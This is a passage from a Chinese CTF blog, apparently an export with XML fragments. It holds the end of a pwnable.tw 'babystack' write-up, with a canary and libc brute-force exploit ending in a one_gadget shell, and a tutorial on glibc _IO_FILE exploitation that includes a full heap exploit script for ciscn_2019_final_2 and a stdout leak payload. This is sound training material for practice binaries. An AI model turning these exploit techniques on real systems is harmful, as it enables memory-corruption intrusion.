<p>在gdb里调试了下，deadbeef是在login里面进行输入的内容，而8个b则是在copy功能里面输入的，可以看见，这两个输入是存在连续空间的，所以是可以在login里面输入好数据，让strcpy一直不断往下的复制，从而覆盖到返回地址。这里填入的deadbeef是通过’\x00’截断的，但是这显然是无用的，因为就算覆盖了返回地址，但是我们缺少了libc地址，也无法成功getshell，所以需要泄露地址，此时的login函数里面的漏洞就派上用场，可以进行由我们自主控制长度的进行不断地爆破，从而可以逐字节爆破存放在栈上的libc地址。</p>
<p><img src="/2021/11/08/2021-12-08-pwnable-tw/image-20220313215126094.png"><span class="image-caption">image-20220313215126094</span></p>
<p><img src="/2021/11/08/2021-12-08-pwnable-tw/image-20220313225030746.png"><span class="image-caption">image-20220313225030746</span></p>
<p><img src="/2021/11/08/2021-12-08-pwnable-tw/image-20220313225146974.png"><span class="image-caption">image-20220313225146974</span></p>
<p>这里是断点在strncmp函数处，两个红框是要比对的内容，下面的0x7f打头是要爆破的内容，我们自己在输入的字符串后面加’\x00’进行截断。</p>
<p><img src="/2021/11/08/2021-12-08-pwnable-tw/image-20220314162654799.png"><span class="image-caption">image-20220314162654799</span></p>
<p>最后就是这个memcmp，我一直不知道是干嘛的，直到触发了canary才反应过来去看下ida代码，发现这里是全程序中唯一个能触发出canary检查的地方，所以之前那个随机数也是要爆破出来的，之前一直以为不要爆破，只要爆破libc地址即可。</p>
<p><img src="/2021/11/08/2021-12-08-pwnable-tw/image-20220314171506095.png"><span class="image-caption">image-20220314171506095</span></p>
<p>本地打通，远程就不打了，因为远程卡，爆破比较多，很慢。远程只要注意把one_gadget换成给的libc的最后一个偏移即可</p>
<p><img src="/2021/11/08/2021-12-08-pwnable-tw/image-20220314171309899.png"><span class="image-caption">image-20220314171309899</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./babystack&quot;</span>)<br>libc = elf.libc<br>p = process(<span class="hljs-string">&#x27;./babystack&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(p,&quot;b *$rebase (0x102b)&quot;)</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login</span>(<span class="hljs-params">rand_num</span>):</span><br>	p.recvuntil(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>)<br>	p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Your passowrd :&quot;</span>)<br>	p.send(rand_num)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">copy</span>(<span class="hljs-params">content</span>):</span><br>	p.recvuntil(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>)<br>	p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Copy :&quot;</span>)<br>	p.send(content)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">logout</span>():</span><br>	p.recvuntil(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>)<br>	p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br><br>rand = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>	<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">256</span>):<br>		login(rand + <span class="hljs-built_in">chr</span>(j) + <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>		<span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Success&quot;</span> <span class="hljs-keyword">in</span> p.recvline():<br>			rand += <span class="hljs-built_in">chr</span>(j) <br>			logout()<br>			<span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(rand)<br><br>login(<span class="hljs-string">&#x27;\x00&#x27;</span> + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x47</span>)<br>copy(<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0x39</span>)<br>logout()<br>string = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>	<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">256</span>):<br>		login(string + <span class="hljs-built_in">chr</span>(j) + <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>		<span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Success&quot;</span> <span class="hljs-keyword">in</span> p.recvline():<br>			string += <span class="hljs-built_in">chr</span>(j) <br>			logout()<br>			<span class="hljs-keyword">break</span><br>libc = u64(string[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) - libc.sym[<span class="hljs-string">&quot;_IO_file_setbuf&quot;</span>] - <span class="hljs-number">9</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc))<br><br>ogg = libc + <span class="hljs-number">0xf1247</span><br>login(<span class="hljs-string">&#x27;\x00&#x27;</span> + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x3f</span> + rand + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span> + p64(ogg))<br>copy(<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0x39</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>PWN,pwnable.tw</tag>
      </tags>
  </entry>
  <entry>
    <title>_IO_FLIE</title>
    <url>/2021/11/06/2021-11-06-IO-FLIE/</url>
    <content><![CDATA[<h1 id="利用环境"><a href="#利用环境" class="headerlink" title="利用环境"></a>利用环境</h1><p>介绍的函数都是glibc-2.23及以下适用，后面的内容才会介绍高版本的利用，但是也是在这个基础上对新检查的对抗与绕过</p>
<h1 id="IO-FILE"><a href="#IO-FILE" class="headerlink" title="_IO_FILE"></a>_IO_FILE</h1><h2 id="主要函数功能介绍"><a href="#主要函数功能介绍" class="headerlink" title="主要函数功能介绍"></a>主要函数功能介绍</h2><p><strong>FILE *fopen(const char *filename,  const char *mode)</strong></p>
<p>使用给定的模式 <strong>mode</strong> 打开 <strong>filename</strong> 所指向的文件，返回一个文件指针fp，fp指向存储在<strong>堆上</strong>的FILE结构体。如果打开失败则返回NULL</p>
<p><strong>size_t fread(void *ptr,  size_t size,  size_t nmemb,  FILE *stream)</strong></p>
<p> 从给定流 <strong>stream</strong> 读取数据到 <strong>ptr</strong> 所指向的数组中，返回成功读取的对象个数，若出现错误或到达文件末尾，则可能小于count</p>
<p><strong>size_t fwrite(const void *ptr,  size_t size,  size_t nmemb,  FILE *stream)</strong></p>
<p>把 <strong>ptr</strong> 所指向的数组中的数据写入到给定流 <strong>stream</strong> 中，返回实际写入的数据块数目</p>
<p><strong>int fclose(FILE *stream)</strong></p>
<p>关闭文件流，并且释放相应文件指针指向的缓冲区（堆块）</p>
<h2 id="主要结构体介绍"><a href="#主要结构体介绍" class="headerlink" title="主要结构体介绍"></a>主要结构体介绍</h2><p>当使用fopen打开一个文件，会在堆上分配一块内存用来存储_IO_FILE_plus结构体，FILE结构体有两个成员<code>_IO_FILE</code>以及<code>_IO_jump_t</code>，这两个成员也是结构体。如下源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span></span><br><span class="hljs-class">&#123;</span><br>    _IO_FILE    file;<br>    _IO_jump_t   *vtable;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>_IO_FILE存储着一些文件相关的指针信息，该结构体的大小：64位下的长度为0xd8； 32位下的长度为0x94（以下涉及的都是64位）。源码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> &#123;</span><br>  <span class="hljs-keyword">long</span> <span class="hljs-keyword">int</span> _flags;       <span class="hljs-comment">/* High-order word is _IO_MAGIC; rest is flags. */</span><br>  <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _IO_file_flags _flags</span><br>    <br>  <span class="hljs-comment">/* The following pointers correspond to the C++ streambuf protocol. */</span><br>  <span class="hljs-comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span><br>  <span class="hljs-keyword">char</span>* _IO_read_ptr;   <span class="hljs-comment">/* Current read pointer */</span><br>  <span class="hljs-keyword">char</span>* _IO_read_end;   <span class="hljs-comment">/* End of get area. */</span><br>  <span class="hljs-keyword">char</span>* _IO_read_base;  <span class="hljs-comment">/* Start of get area. */</span><br>  <span class="hljs-keyword">char</span>* _IO_write_base; <span class="hljs-comment">/* Start of put area. */</span><br>  <span class="hljs-keyword">char</span>* _IO_write_ptr;  <span class="hljs-comment">/* Current put pointer. */</span><br>  <span class="hljs-keyword">char</span>* _IO_write_end;  <span class="hljs-comment">/* End of put area. */</span><br>  <span class="hljs-keyword">char</span>* _IO_buf_base;   <span class="hljs-comment">/* Start of reserve area. */</span><br>  <span class="hljs-keyword">char</span>* _IO_buf_end;    <span class="hljs-comment">/* End of reserve area. */</span><br>  <span class="hljs-comment">/* The following fields are used to support backing up and undo. */</span><br>  <span class="hljs-keyword">char</span> *_IO_save_base; <span class="hljs-comment">/* Pointer to start of non-current get area. */</span><br>  <span class="hljs-keyword">char</span> *_IO_backup_base;  <span class="hljs-comment">/* Pointer to first valid character of backup area */</span><br>  <span class="hljs-keyword">char</span> *_IO_save_end; <span class="hljs-comment">/* Pointer to end of non-current get area. */</span><br> <br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_marker</span> *_<span class="hljs-title">markers</span>;</span><br> <br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *_<span class="hljs-title">chain</span>;</span><br> <br>  <span class="hljs-keyword">int</span> _fileno;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> 0</span><br>  <span class="hljs-keyword">int</span> _blksize;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br>  <span class="hljs-keyword">int</span> _flags2;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>  _IO_off_t _old_offset; <span class="hljs-comment">/* This used to be _offset but it&#x27;s too small.  */</span><br> <br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __HAVE_COLUMN <span class="hljs-comment">/* temporary */</span></span><br>  <span class="hljs-comment">/* 1+column number of pbase(); 0 is unknown. */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span> _cur_column;<br>  <span class="hljs-keyword">signed</span> <span class="hljs-keyword">char</span> _vtable_offset;<br>  <span class="hljs-keyword">char</span> _shortbuf[<span class="hljs-number">1</span>];<br> <br><span class="hljs-comment">/*  char* _save_gptr;  char* _save_egptr; */</span><br> <br>_IO_lock_t *_lock;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span><br>&#125;;<br></code></pre></td></tr></table></figure>

<p>在 _IO_FILE 中的各变量的偏移：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x0</span>   _flags<br><span class="hljs-number">0x8</span>   _IO_read_ptr<br><span class="hljs-number">0x10</span>  _IO_read_end<br><span class="hljs-number">0x18</span>  _IO_read_base<br><span class="hljs-number">0x20</span>  _IO_write_base<br><span class="hljs-number">0x28</span>  _IO_write_ptr<br><span class="hljs-number">0x30</span>  _IO_write_end<br><span class="hljs-number">0x38</span>  _IO_buf_base<br><span class="hljs-number">0x40</span>  _IO_buf_end<br><span class="hljs-number">0x48</span>  _IO_save_base<br><span class="hljs-number">0x50</span>  _IO_backup_base<br><span class="hljs-number">0x58</span>  _IO_save_end<br><span class="hljs-number">0x60</span>  _markers<br><span class="hljs-number">0x68</span>  _chain<br><span class="hljs-number">0x70</span>  _fileno<br><span class="hljs-number">0x74</span>  _flags2<br><span class="hljs-number">0x78</span>  _old_offset<br><span class="hljs-number">0x80</span>  _cur_column<br><span class="hljs-number">0x82</span>  _vtable_offset<br><span class="hljs-number">0x83</span>  _shortbuf<br><span class="hljs-number">0x88</span>  _lock<br><span class="hljs-number">0x90</span>  _offset<br><span class="hljs-number">0x98</span>  _codecvt<br><span class="hljs-number">0xa0</span>  _wide_data<br><span class="hljs-number">0xa8</span>  _freeres_list<br><span class="hljs-number">0xb0</span>  _freeres_buf<br><span class="hljs-number">0xb8</span>  __pad5<br><span class="hljs-number">0xc0</span>  _mode<br><span class="hljs-number">0xc4</span>  _unused2<br><span class="hljs-number">0xd8</span>  vtable<br></code></pre></td></tr></table></figure>

<p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20211122203241140.png"><span class="image-caption">image-20211122203241140</span></p>
<p>在glibc-2.23版本中有个全局变量<code>_IO_list_all</code>，该变量指向了FILE链表的头部。在没有创建其它文件结构时，<code>_IO_list_all</code>指向stderr，然后依次是stdout和stdin。这里使用<code>p/x *(struct _IO_FILE_plus*) _IO_list_all</code>可以详细的打印其内存数据信息。其中<code>_fileno</code>的值就是文件描述符，<code>_chain</code>字段指向下一个链表节点</p>
<p>所有的文件都共享一个虚函数表，_IO_jump_t  *vtable则指向这个虚函数表（保存各种操作函数的指针），源码如下：JUMP_FIELD 是一个接收两个参数的宏，前一个参数为类型名，后一个为变量名</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> JUMP_FIELD(TYPE, NAME) TYPE NAME</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span></span><br><span class="hljs-class">&#123;</span><br>    JUMP_FIELD(<span class="hljs-keyword">size_t</span>, __dummy);<br>    JUMP_FIELD(<span class="hljs-keyword">size_t</span>, __dummy2);<br>    JUMP_FIELD(_IO_finish_t, __finish);<br>    JUMP_FIELD(_IO_overflow_t, __overflow);<br>    JUMP_FIELD(_IO_underflow_t, __underflow);<br>    JUMP_FIELD(_IO_underflow_t, __uflow);<br>    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);<br>    <span class="hljs-comment">/* showmany */</span><br>    JUMP_FIELD(_IO_xsputn_t, __xsputn);<br>    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);<br>    JUMP_FIELD(_IO_seekoff_t, __seekoff);<br>    JUMP_FIELD(_IO_seekpos_t, __seekpos);<br>    JUMP_FIELD(_IO_setbuf_t, __setbuf);<br>    JUMP_FIELD(_IO_sync_t, __sync);<br>    JUMP_FIELD(_IO_doallocate_t, __doallocate);<br>    JUMP_FIELD(_IO_read_t, __read);<br>    JUMP_FIELD(_IO_write_t, __write);<br>    JUMP_FIELD(_IO_seek_t, __seek);<br>    JUMP_FIELD(_IO_close_t, __close);<br>    JUMP_FIELD(_IO_stat_t, __stat);<br>    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);<br>    JUMP_FIELD(_IO_imbue_t, __imbue);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> 0</span><br>    get_column;<br>    set_column;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure>

<p>在gdb中查看，会对存储的函数指针更加详细的名称</p>
<p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20211122204732406.png"><span class="image-caption">image-20211122204732406</span></p>
<h2 id="利用手法"><a href="#利用手法" class="headerlink" title="利用手法"></a>利用手法</h2><h3 id="一、利用-fileno"><a href="#一、利用-fileno" class="headerlink" title="一、利用_fileno"></a>一、利用_fileno</h3><p>因为<code>_fileno</code>的值就是文件描述符，有时 flag 文件已经被程序打开，创建了相应的文件描述符。如果我们将这个文件描述符的值填入到<code>stdin</code>的<code>_fileno</code>处，那么当使用到如<code>scanf、gets、fscanf</code>函数会调用到<code>stdin</code>，获取的到的字符就就会是flag的内容。</p>
<h4 id="例题ciscn-2019-final-2"><a href="#例题ciscn-2019-final-2" class="headerlink" title="例题ciscn_2019_final_2"></a>例题ciscn_2019_final_2</h4><p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20211128191339962.png"><span class="image-caption">image-20211128191339962</span></p>
<p>常规checksec，64位，保护全开</p>
<p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20211128191623857-16380981914061.png"><span class="image-caption">image-20211128191623857</span></p>
<p>程序开了沙箱，禁用了execve系统执行函数</p>
<p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20211128191723423.png"><span class="image-caption">image-20211128191723423</span></p>
<p>程序在初始化时，打开了flag文件，并且把文件描述符转为了666</p>
<p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20211128191423540.png"><span class="image-caption">image-20211128191423540</span></p>
<p>释放堆块存在UAF</p>
<p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20211128191445436.png"><span class="image-caption">image-20211128191445436</span></p>
<p>申请堆块只能申请0x10和0x20的堆块</p>
<p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20211128211402143.png"><span class="image-caption">image-20211128211402143</span></p>
<p>还有个输入函数，执行完会把输入的内容打印出来</p>
<p>所以做法是劫持 stdin 的 fileno 为666从而读取flag内容并且打印出来，因为 scanf 获取的输入是来自于 stdin ，如果把 stdin 的fileno 修改为之前 flag 文件流对应的文件描述符666，即可实现 stdin 从flag里面读取内容，然后程序会把内容打印出来，从而获得flag</p>
<p>这边最有意思的点在于最后要分配到 stdin 上的堆块，由于泄露的地址是不全的，并且我们的任意分配是借助 double free 制造的堆块重叠，是不存在0x7f的头的，所以要申请出一块含有0x7f头的堆块，部分写修改0x7f为 stdin 的地址，然后在double free制造出堆块重叠时，借助第一次申请，把fd指向的堆块地址修改为含有 stdin 的地址的堆块，就能让其也成为tcache链上的一个堆块，从而成功分配出堆块</p>
<p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20211128211228537.png"><span class="image-caption">image-20211128211228537</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./ciscn_final_2&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-2.27.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">25539</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br>	<span class="hljs-comment">#gdb.attach(p,&quot;b *$rebase(0x)&quot;)</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx, content</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.recvuntil(<span class="hljs-string">&quot;your inode number:&quot;</span>)<br>    p.send(<span class="hljs-built_in">str</span>(content))<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>():</span><br>    p.sendlineafter(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;what do you want to say at last?\n&quot;</span>)<br>    p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot; &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x20</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x20</span>)<br>free(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">1</span>)<br>p.recvuntil(<span class="hljs-string">&quot;your int type inode number :&quot;</span>)<br>heap_base = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">10</span>)) - <span class="hljs-number">0x250</span><br>log.info(<span class="hljs-string">&quot;heap_base==&gt;0x%x&quot;</span> %heap_base)<br>add(<span class="hljs-number">1</span>, heap_base)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x20</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x20</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    free(<span class="hljs-number">1</span>)<br>    add(<span class="hljs-number">2</span>, <span class="hljs-number">0x20</span>)<br>free(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">1</span>)<br>p.recvuntil(<span class="hljs-string">&quot;your int type inode number :&quot;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">10</span>))  - <span class="hljs-number">0x3ebca0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>fileno = libc_base + <span class="hljs-number">0x3eba70</span><br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x0202</span>)<br>add(<span class="hljs-number">1</span>, fileno)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">2</span>, fileno)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">1</span>, heap_base + <span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">666</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">666</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">666</span>)<br>edit()<br><br>p.interactive()<br></code></pre></td></tr></table></figure>



<h3 id="二、劫持文件流"><a href="#二、劫持文件流" class="headerlink" title="二、劫持文件流"></a>二、劫持文件流</h3><p>fopen函数在分配空间，建立FILE结构体，未调用vtable中的函数。执行流程如下：</p>
<ol>
<li><code>malloc</code>分配内存空间。</li>
<li><code>_IO_no_init</code> 对FILE结构体进行<code>null</code>初始化。</li>
<li><code>_IO_file_init</code>将结构体链接进<code>_IO_list_all</code>链表。</li>
<li><code>_IO_file_fopen</code>执行系统调用打开文件。</li>
</ol>
<p>fread函数中调用的vtable函数有：</p>
<ul>
<li><code>_IO_sgetn</code>函数调用了vtable的<code>_IO_file_xsgetn</code>。</li>
<li><code>_IO_doallocbuf</code>函数调用了vtable的<code>_IO_file_doallocate</code>以初始化输入缓冲区。</li>
<li>vtable中的<code>_IO_file_doallocate</code>调用了vtable中的<code>__GI__IO_file_stat</code>以获取文件信息。</li>
<li><code>__underflow</code>函数调用了vtable中的<code>_IO_new_file_underflow</code>实现文件数据读取到缓冲区。</li>
<li>vtable中的<code>_IO_new_file_underflow</code>调用了vtable<code>__GI__IO_file_read</code>最终去执行系统调用read。</li>
</ul>
<p>fwrite 函数调用的vtable函数有：</p>
<ul>
<li><code>_IO_fwrite</code>函数调用了vtable的<code>_IO_new_file_xsputn</code>。</li>
<li><code>_IO_new_file_xsputn</code>函数调用了vtable中的<code>_IO_new_file_overflow</code>实现缓冲区的建立以及刷新缓冲区。</li>
<li>vtable中的<code>_IO_new_file_overflow</code>函数调用了vtable的<code>_IO_file_doallocate</code>以初始化输入缓冲区。</li>
<li>vtable中的<code>_IO_file_doallocate</code>调用了vtable中的<code>__GI__IO_file_stat</code>以获取文件信息。</li>
<li><code>new_do_write</code>中的<code>_IO_SYSWRITE</code>调用了vtable<code>_IO_new_file_write</code>最终去执行系统调用write。</li>
</ul>
<p>fclose 函数调用的vtable函数有：</p>
<ul>
<li>在清空缓冲区的<code>_IO_do_write</code>函数中会调用vtable中的函数。</li>
<li>关闭文件描述符<code>_IO_SYSCLOSE</code>函数为vtable中的<code>__close</code>函数。</li>
<li><code>_IO_FINISH</code>函数为vtable中的<code>__finish</code>函数。</li>
</ul>
<ul>
<li>printf/puts 最终会调用_IO_file_xsputn</li>
<li>fclose 最终会调用_IO_FILE_FINISH</li>
<li>fwrite最终会调用_IO_file_xsputn</li>
<li>fread 最终会调用_IO_file_xsgetn</li>
<li>scanf/gets最终会调用_IO_file_xsgetn</li>
</ul>
<h4 id="方式一、劫持vtable"><a href="#方式一、劫持vtable" class="headerlink" title="方式一、劫持vtable"></a>方式一、劫持vtable</h4><p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20211111215424904.png"><span class="image-caption">image-20211111215424904</span></p>
<p>在调用 fclose 关闭一个文件时，最终会调用到 vtable 中存储的函数指针。如果我们能够将 vtable 中的指针替换为我们自己想要跳转到的地址就可以劫持程序流程。</p>
<p>覆盖 vtable 指针指向可控内存，将 __finish(off=2*SIZE_T) 构造为要执行的地址。然后调用 fclose</p>
<p>2.23及以前可用，后面的版本会检查 vtable 的合法性。</p>
<h4 id="方式二、伪造vtable"><a href="#方式二、伪造vtable" class="headerlink" title="方式二、伪造vtable"></a>方式二、伪造vtable</h4><p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20211111215424904.png"><span class="image-caption">image-20211111215424904</span></p>
<p>当无法直接修改 vtable 指针时，却可以修改返回的文件指针 fp。这时候就要伪造整个 FILE 结构体通过检查，再在伪造的 FILE 结构里面修改 vtable 指针以及 __finish(off=2*SIZE_T)。将文件指针指向这个伪造的 FILE 结构体，最后调用 fclose</p>
<h3 id="三、利用stdout泄露libc"><a href="#三、利用stdout泄露libc" class="headerlink" title="三、利用stdout泄露libc"></a>三、利用stdout泄露libc</h3><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> &#123;</span><br>  <span class="hljs-keyword">int</span> _flags;            <span class="hljs-comment">// 文件标志，简单的说：像puts一类的输入输出函数要想正确的打印信息就需要正确设置该字段</span><br>  <span class="hljs-keyword">char</span>* _IO_read_ptr;    <span class="hljs-comment">/* Current read pointer */</span><br>  <span class="hljs-keyword">char</span>* _IO_read_end;    <span class="hljs-comment">/* End of get area. */</span><br>  <span class="hljs-keyword">char</span>* _IO_read_base;    <span class="hljs-comment">/* Start of putback+get area. */</span><br>  <span class="hljs-keyword">char</span>* _IO_write_base;    <span class="hljs-comment">/* Start of put area. */</span><br>  <span class="hljs-keyword">char</span>* _IO_write_ptr;    <span class="hljs-comment">/* Current put pointer. */</span><br>  <span class="hljs-keyword">char</span>* _IO_write_end;    <span class="hljs-comment">/* End of put area. */</span><br>......<br>......<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这个利用方法较为常见，一般在没有打印函数时，用于泄露libc。将堆块分配到<code>stdout</code>指针处存储的<code>_IO_2_1_stdout_</code>该IO_FILE结构体处，修改其<code>_flags</code>为合法的数值，将后面三个 read 指针置空，将<code>_IO_write_base</code>处的第一个字节改小，后面的<code>_IO_write_ptr</code>和<code>_IO_write_end</code>保持不变。之后当程序遇到puts函数时就会打印<code>_IO_write_base</code>到<code>_IO_write_ptr</code>之间的内容</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">payload = p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + <span class="hljs-string">&#x27;\x00&#x27;</span><br>libc_base = libc - libc.sym[<span class="hljs-string">&quot;_IO_file_jumps&quot;</span>]<br></code></pre></td></tr></table></figure>

<p>这样泄露出来的第一个地址将会是<code>_IO_file_jumps</code></p>
